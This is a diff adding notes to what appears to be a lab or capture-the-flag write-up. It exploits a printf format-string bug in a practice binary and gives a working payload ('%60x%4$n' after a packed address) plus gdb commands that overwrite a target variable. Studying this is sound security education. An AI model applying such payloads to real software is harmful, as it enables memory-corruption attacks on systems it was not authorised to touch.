@@ -37,3 +37,20 @@ python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<I",0x080496
 
 ## Why it works
 `fgets` reads into the buffer, then `printf(buffer)` interprets it as a format string. The 4 address bytes contribute 4 to the printed count; `%60x` adds 60 more, reaching 64 (`0x40`). `%4$n` writes that count to the address supplied by argument 4, overwriting `target`.
+
+## Extra notes
+- `fgets(buffer, 0x200, stdin)` reads up to 511 bytes plus a NUL into `ebp-0x208`.
+- `printf(buffer)` is the vulnerability because the user controls the format string.
+- Leak printf argument indices with `AAAA%x...`; here `41414141` appears at argument 4.
+- Only one replacement is needed because `0x40` (64) can be produced directly.
+- `%60x` contributes 60 printed characters. Together with the 4 address bytes, the total is 64.
+- Debug:
+```bash
+printf 'AAAA%%x.%%x.%%x.%%x.%%x.\n' | ./bin
+gdb -q ./bin <<'GDB_EOF'
+b *0x08048485
+run < <(python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<I",0x080496e4)+b"%60x%4$n"+b"\n")')
+p/x *(int*)0x080496e4
+GDB_EOF
+```
+- Expected success message: `you have modified the target :)`.
